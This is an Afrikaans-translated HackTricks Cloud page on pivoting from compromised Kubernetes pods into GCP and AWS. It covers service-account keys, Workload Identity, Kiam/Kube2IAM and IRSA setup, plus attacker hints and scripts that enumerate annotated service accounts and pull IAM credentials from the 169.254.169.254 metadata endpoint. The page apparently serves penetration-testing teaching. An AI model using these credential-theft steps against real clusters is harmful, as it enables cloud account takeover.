# Kubernetes Pivoting to Clouds

{% hint style="success" %}
Leer & oefen AWS-hacking:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Opleiding AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Leer & oefen GCP-hacking: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Opleiding GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Ondersteun HackTricks</summary>

* Controleer die [**inskrywingsplanne**](https://github.com/sponsors/carlospolop)!
* **Sluit aan by die** üí¨ [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Deel hacking-truuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-opslag.

</details>
{% endhint %}

## GCP

Indien jy 'n k8s-kluster binne GCP hardloop, wil jy waarskynlik h√™ dat 'n toepassing wat binne die kluster hardloop, toegang tot GCP het. Daar is 2 algemene maniere om dit te doen:

### Monteer GCP-SA-sleutels as geheim

'n Algemene manier om **toegang tot 'n kubernetes-toepassing tot GCP te gee** is om:

* Skep 'n GCP-diensrekening
* Bind die gewenste regte daaraan
* Laai 'n json-sleutel van die geskepte SA af
* Monteer dit as 'n geheim binne die houer
* Stel die GOOGLE\_APPLICATION\_CREDENTIALS-omgewingsveranderlike in wat na die pad wys waar die json is.

{% hint style="warning" %}
Daarom, as 'n **aanvaller**, as jy 'n houer binne 'n peul kompromitteer, moet jy vir daardie **omgewingsveranderlike** en **json-l√™ers** met GCP-legitimasie kyk.
{% endhint %}

### Verband GSA-json met KSA-geheim

'n Manier om 'n GSA toegang tot 'n GKE-kluster te gee, is deur hulle op hierdie manier te bind:

* Skep 'n Kubernetes-diensrekening in dieselfde naamspasie as jou GKE-kluster deur die volgende bevel te gebruik:
```bash
Copy codekubectl create serviceaccount <service-account-name>
```
* Skep 'n Kubernetes-geheim wat die geloofsbriewe van die GCP-diensrekening bevat waartoe jy toegang tot die GKE-cluster wil verleen. Jy kan dit doen met behulp van die `gcloud` opdraglynwerktuig, soos in die volgende voorbeeld getoon:
```bash
Copy codegcloud iam service-accounts keys create <key-file-name>.json \
--iam-account <gcp-service-account-email>
kubectl create secret generic <secret-name> \
--from-file=key.json=<key-file-name>.json
```
* Bind die Kubernetes-geheim aan die Kubernetes-diensrekening deur die volgende bevel te gebruik:
```bash
Copy codekubectl annotate serviceaccount <service-account-name> \
iam.gke.io/gcp-service-account=<gcp-service-account-email>
```
{% hint style="warning" %}
In die **tweede stap** is die **gelde van die GSA as geheim van die KSA** ingestel. Dan, as jy daardie geheim van binne die GKE-cluster **kan lees**, kan jy **opgradeer na daardie GCP-diensrekening**.
{% endhint %}

### GKE Werklasidentiteit

Met Werklasidentiteit kan ons 'n [Kubernetes-diensrekening](https://kubernetes.io/docs/tasks/configure-pod-container/configure-service-account/) konfigureer om as 'n [Google-diensrekening](https://cloud.google.com/iam/docs/understanding-service-accounts) op te tree. Pods wat met die Kubernetes-diensrekening hardloop, sal outomaties as die Google-diensrekening geverifieer word wanneer hulle Google Cloud API's benader.

Die **eerste reeks stappe** om hierdie gedrag moontlik te maak, is om **Werklasidentiteit in GCP te aktiveer** ([**stappe**](https://medium.com/zeotap-customer-intelligence-unleashed/gke-workload-identity-a-secure-way-for-gke-applications-to-access-gcp-services-f880f4e74e8c)) en die GCP SA te skep wat jy wil h√™ k8s moet nadoen.

* **Aktiveer Werklasidentiteit** op 'n nuwe cluster

{% code overflow="wrap" %}
```bash
gcloud container clusters update <cluster_name> \
--region=us-central1 \
--workload-pool=<project-id>.svc.id.goog
```
{% endcode %}

* **Skep/Odateer 'n nuwe nodepool** (Autopilot-klusters het nie hierdie nodig nie)

{% code overflow="wrap" %}
```bash
# You could update instead of create
gcloud container node-pools create <nodepoolname> --cluster=<cluser_name> --workload-metadata=GKE_METADATA --region=us-central1
```
{% endcode %}

* Skep die **GCP-diensrekening om te impersoneer** vanaf K8s met GCP-toestemmings: 

{% code overflow="wrap" %}
```bash
# Create SA called "gsa2ksa"
gcloud iam service-accounts create gsa2ksa --project=<project-id>

# Give "roles/iam.securityReviewer" role to the SA
gcloud projects add-iam-policy-binding <project-id> \
--member "serviceAccount:gsa2ksa@<project-id>.iam.gserviceaccount.com" \
--role "roles/iam.securityReviewer"
```
{% endcode %}

* **Koppel** aan die **kluster** en **skep** die **diensrekening** om te gebruik

{% code overflow="wrap" %}
```bash
# Get k8s creds
gcloud container clusters get-credentials <cluster_name> --region=us-central1

# Generate our testing namespace
kubectl create namespace testing

# Create the KSA
kubectl create serviceaccount ksa2gcp -n testing
```
{% endcode %}

* **Koppel die GSA met die KSA**

{% code overflow="wrap" %}
```bash
# Allow the KSA to access the GSA in GCP IAM
gcloud iam service-accounts add-iam-policy-binding gsa2ksa@<project-id.iam.gserviceaccount.com \
--role roles/iam.workloadIdentityUser \
--member "serviceAccount:<project-id>.svc.id.goog[<namespace>/ksa2gcp]"

# Indicate to K8s that the SA is able to impersonate the GSA
kubectl annotate serviceaccount ksa2gcp \
--namespace testing \
iam.gke.io/gcp-service-account=gsa2ksa@security-devbox.iam.gserviceaccount.com
```
{% endcode %}

* Hardloop 'n **pod** met die **KSA** en kontroleer die **toegang** tot die **GSA:**
```bash
# If using Autopilot remove the nodeSelector stuff!
echo "apiVersion: v1
kind: Pod
metadata:
name: workload-identity-test
namespace: <namespace>
spec:
containers:
- image: google/cloud-sdk:slim
name: workload-identity-test
command: ['sleep','infinity']
serviceAccountName: ksa2gcp
nodeSelector:
iam.gke.io/gke-metadata-server-enabled: 'true'" | kubectl apply -f-

# Get inside the pod
kubectl exec -it workload-identity-test \
--namespace testing \
-- /bin/bash

# Check you can access the GSA from insie the pod with
curl -H "Metadata-Flavor: Google" http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/email
gcloud auth list
```
Kyk na die volgende bevel om te verifieer in geval van nodig:

{% code overflow="wrap" %}
```bash
gcloud auth activate-service-account --key-file=/var/run/secrets/google/service-account/key.json
```
{% endcode %}

{% hint style="warning" %}
As 'n aanvaller binne K8s moet jy soek vir SAs met die `iam.gke.io/gcp-service-account` annotasie aangesien dit aandui dat die SA toegang tot iets in GCP kan h√™. 'n Ander opsie sou wees om elke KSA in die groep te misbruik en te kyk of dit toegang het.\
Vanaf GCP is dit altyd interessant om die bindings op te som en te weet watter toegang jy aan SAs binne Kubernetes gee.
{% endhint %}

Hierdie is 'n skrip om maklik oor al die pod definisies te **itereer** op soek na daardie **annotasie**:
```bash
for ns in `kubectl get namespaces -o custom-columns=NAME:.metadata.name | grep -v NAME`; do
for pod in `kubectl get pods -n "$ns" -o custom-columns=NAME:.metadata.name | grep -v NAME`; do
echo "Pod: $ns/$pod"
kubectl get pod "$pod" -n "$ns" -o yaml | grep "gcp-service-account"
echo ""
echo ""
done
done | grep -B 1 "gcp-service-account"
```
## AWS

### Kiam & Kube2IAM (IAM rol vir Pods) <a href="#workflow-of-iam-role-for-service-accounts" id="workflow-of-iam-role-for-service-accounts"></a>

'n (verouderde) manier om IAM-rolle aan Pods te gee is om 'n [**Kiam**](https://github.com/uswitch/kiam) of 'n [**Kube2IAM**](https://github.com/jtblin/kube2iam) **bediener** te gebruik. Basies moet jy 'n **daemonset** in jou cluster hardloop met 'n **soort bevoorregte IAM-rol**. Hierdie daemonset sal die een wees wat toegang tot IAM-rolle gee aan die pods wat dit nodig het.

Eerstens moet jy **configureer watter rolle binne die namespace toeganklik is**, en jy doen dit met 'n annotasie binne die namespace objek:

{% code title="Kiam" %}
```yaml
kind: Namespace
metadata:
name: iam-example
annotations:
iam.amazonaws.com/permitted: ".*"
```
{% endcode %}

{% code title="Kube2iam" %}
```yaml
apiVersion: v1
kind: Namespace
metadata:
annotations:
iam.amazonaws.com/allowed-roles: |
["role-arn"]
name: default
```
{% endcode %}

Sodra die namespace ingestel is met die IAM-rolle wat die Pods kan h√™, kan jy **die rol aandui wat jy op elke poddefinisie wil h√™ met iets soos**:

{% code title="Kiam & Kube2iam" %}
```yaml
kind: Pod
metadata:
name: foo
namespace: external-id-example
annotations:
iam.amazonaws.com/role: reportingdb-reader
```
{% endcode %}

{% hint style="warning" %}
As 'n aanvaller, as jy **hierdie aantekeninge** in pods of benamings vind of 'n kiam/kube2iam-bediener wat loop (waarskynlik in kube-stelsel), kan jy **elke r**ol impersoneer wat reeds **deur pods gebruik word** en meer (as jy toegang het tot die AWS-rekening, enumereer die rolle).
{% endhint %}

#### Skep Pod met IAM Rol

{% hint style="info" %}
Die IAM-rol wat aangedui moet word, moet in dieselfde AWS-rekening as die kiam/kube2iam-rol wees en daardie rol moet daartoe in staat wees om dit te benader.
{% endhint %}
```yaml
echo 'apiVersion: v1
kind: Pod
metadata:
annotations:
iam.amazonaws.com/role: transaction-metadata
name: alpine
namespace: eevee
spec:
containers:
- name: alpine
image: alpine
command: ["/bin/sh"]
args: ["-c", "sleep 100000"]' | kubectl apply -f -
```
### IAM Rolle vir K8s-diensrekeninge via OIDC <a href="#workflow-of-iam-role-for-service-accounts" id="workflow-of-iam-role-for-service-accounts"></a>

Dit is die **aanbevole metode deur AWS**.

1. Eerstens moet jy 'n [OIDC-leweransier vir die groep skep](https://docs.aws.amazon.com/eks/latest/userguide/enable-iam-roles-for-service-accounts.html).
2. Skep dan 'n IAM-rol met die regte wat die SR benodig.
3. Skep 'n [vertrouensverhouding tussen die IAM-rol en die SR](https://docs.aws.amazon.com/eks/latest/userguide/associate-service-account-role.html) naam (of die name van die ruimtes wat toegang tot die rol gee aan al die SR's van die ruimte). _Die vertrouensverhouding sal hoofsaaklik die OIDC-leweransier se naam, die ruimte se naam en die SR se naam nagaan_.
4. Laastens, **skep 'n SR met 'n annotasie wat die ARN van die rol aandui**, en die peule wat met daardie SR hardloop, sal toegang h√™ tot die **teken van die rol**. Die **teken** word **geskryf** binne 'n l√™er en die pad word gespesifiseer in **`AWS_WEB_IDENTITY_TOKEN_FILE`** (verstek: `/var/run/secrets/eks.amazonaws.com/serviceaccount/token`)
```bash
# Create a service account with a role
cat >my-service-account.yaml <<EOF
apiVersion: v1
kind: ServiceAccount
metadata:
name: my-service-account
namespace: default
annotations:
eks.amazonaws.com/role-arn: arn:aws:iam::318142138553:role/EKSOIDCTesting
EOF
kubectl apply -f my-service-account.yaml

# Add a role to an existent service account
kubectl annotate serviceaccount -n $namespace $service_account eks.amazonaws.com/role-arn=arn:aws:iam::$account_id:role/my-role
```
Om **aws te kry met behulp van die token** vanaf `/var/run/secrets/eks.amazonaws.com/serviceaccount/token` hardloop:
```bash
aws sts assume-role-with-web-identity --role-arn arn:aws:iam::123456789098:role/EKSOIDCTesting --role-session-name something --web-identity-token file:///var/run/secrets/eks.amazonaws.com/serviceaccount/token
```
{% endcode %}

{% hint style="warning" %}
As 'n aanvaller, as jy 'n K8s-kluster kan opsom, kyk vir **diensrekeninge met daardie annotasie** om te **eskalereer na AWS**. Om dit te doen, voer/skep net 'n **peul** met behulp van een van die IAM **bevoorregte diensrekeninge** en steel die token.

Verder, as jy binne 'n peul is, kyk vir omgewingsveranderlikes soos **AWS\_ROLE\_ARN** en **AWS\_WEB\_IDENTITY\_TOKEN.**
{% endhint %}

{% hint style="danger" %}
Soms kan die **Vertrouensbeleid van 'n rol** sleg geconfigureer wees en in plaas daarvan om AssumeRole-toegang aan die verwagte diensrekening te gee, gee dit aan **alle diensrekeninge**. Daarom, as jy in staat is om 'n annotasie op 'n beheerde diensrekening te skryf, kan jy toegang tot die rol verkry.

Kyk na die **volgende bladsy vir meer inligting**:
{% endhint %}

{% content-ref url="../aws-security/aws-basic-information/aws-federation-abuse.md" %}
[aws-federation-abuse.md](../aws-security/aws-basic-information/aws-federation-abuse.md)
{% endcontent-ref %}

### Vind Peule en DR'e met IAM-rolle in die Kluster

Hierdie is 'n skripsie om maklik oor **al die peule en dr'e** definisies te **itereer** op soek na daardie **annotasie**:
```bash
for ns in `kubectl get namespaces -o custom-columns=NAME:.metadata.name | grep -v NAME`; do
for pod in `kubectl get pods -n "$ns" -o custom-columns=NAME:.metadata.name | grep -v NAME`; do
echo "Pod: $ns/$pod"
kubectl get pod "$pod" -n "$ns" -o yaml | grep "amazonaws.com"
echo ""
echo ""
done
for sa in `kubectl get serviceaccounts -n "$ns" -o custom-columns=NAME:.metadata.name | grep -v NAME`; do
echo "SA: $ns/$sa"
kubectl get serviceaccount "$sa" -n "$ns" -o yaml | grep "amazonaws.com"
echo ""
echo ""
done
done | grep -B 1 "amazonaws.com"
```
### Node IAM Rol

Die vorige afdeling was oor hoe om IAM-rolle met behulp van pods te steel, maar let daarop dat 'n **Node van die** K8s-kluster 'n **instansie binne die wolk** gaan wees. Dit beteken dat die Node hoogs waarskynlik 'n nuwe IAM-rol gaan h√™ wat jy kan steel (_let daarop dat gewoonlik al die nodes van 'n K8s-kluster dieselfde IAM-rol sal h√™, so dit mag nie die moeite werd wees om op elke node te probeer nie_).

Daar is egter 'n belangrike vereiste om toegang tot die metadata-eindpunt vanaf die node te verkry, jy moet op die node wees (ssh-sessie?) of ten minste dieselfde netwerk h√™:
```bash
kubectl run NodeIAMStealer --restart=Never -ti --rm --image lol --overrides '{"spec":{"hostNetwork": true, "containers":[{"name":"1","image":"alpine","stdin": true,"tty":true,"imagePullPolicy":"IfNotPresent"}]}}'
```
### Steel IAM Rolle Token

Vroe√´r het ons bespreek hoe om **IAM-rolle aan Pods te heg** of selfs hoe om na die Node te **ontsnap om die IAM-rolle** wat aan die instansie geheg is, te steel.

Jy kan die volgende skripsie gebruik om jou nuwe hard gewerkte **IAM-rolle-gedragsbewyse** te **steel**:
```bash
IAM_ROLE_NAME=$(curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ 2>/dev/null || wget  http://169.254.169.254/latest/meta-data/iam/security-credentials/ -O - 2>/dev/null)
if [ "$IAM_ROLE_NAME" ]; then
echo "IAM Role discovered: $IAM_ROLE_NAME"
if ! echo "$IAM_ROLE_NAME" | grep -q "empty role"; then
echo "Credentials:"
curl "http://169.254.169.254/latest/meta-data/iam/security-credentials/$IAM_ROLE_NAME" 2>/dev/null || wget "http://169.254.169.254/latest/meta-data/iam/security-credentials/$IAM_ROLE_NAME" -O - 2>/dev/null
fi
fi
```
## Verwysings

* [https://cloud.google.com/kubernetes-engine/docs/how-to/workload-identity](https://cloud.google.com/kubernetes-engine/docs/how-to/workload-identity)
* [https://medium.com/zeotap-customer-intelligence-unleashed/gke-workload-identity-a-secure-way-for-gke-applications-to-access-gcp-services-f880f4e74e8c](https://medium.com/zeotap-customer-intelligence-unleashed/gke-workload-identity-a-secure-way-for-gke-applications-to-access-gcp-services-f880f4e74e8c)
* [https://blogs.halodoc.io/iam-roles-for-service-accounts-2/](https://blogs.halodoc.io/iam-roles-for-service-accounts-2/)

{% hint style="success" %}
Leer & oefen AWS Hack:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Opleiding AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Leer & oefen GCP Hack: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Opleiding GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Ondersteun HackTricks</summary>

* Kontroleer die [**inskrywingsplanne**](https://github.com/sponsors/carlospolop)!
* **Sluit aan by die** üí¨ [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Deel hacktruuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-opslag.

</details>
{% endhint %}
